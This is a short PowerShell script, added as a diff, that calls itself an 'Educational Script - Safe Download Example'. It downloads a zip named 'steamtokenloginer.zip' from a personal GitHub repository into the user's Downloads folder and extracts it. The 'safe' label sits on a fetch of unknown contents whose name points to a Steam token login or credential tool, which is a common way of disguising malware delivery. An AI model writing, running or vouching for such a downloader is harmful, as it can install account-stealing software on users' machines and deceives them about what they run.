@@ -1,0 +1,14 @@
+# Educational Script - Safe Download Example
+$zipUrl = "https://github.com/gseff137-afk/test/raw/refs/heads/main/steamtokenloginer.zip"
+$zipPath = "$HOME\Downloads\steamtokenloginer.zip"
+$extractPath = "$HOME\Downloads\SteamToken"
+
+# Скачиваем ZIP
+Write-Host "Downloading..." -ForegroundColor Yellow
+Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
+
+# Распаковываем (если бы был пароль)
+Write-Host "Extracting..." -ForegroundColor Yellow
+Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
+
+Write-Host "Completed! Files in: $extractPath" -ForegroundColor Green
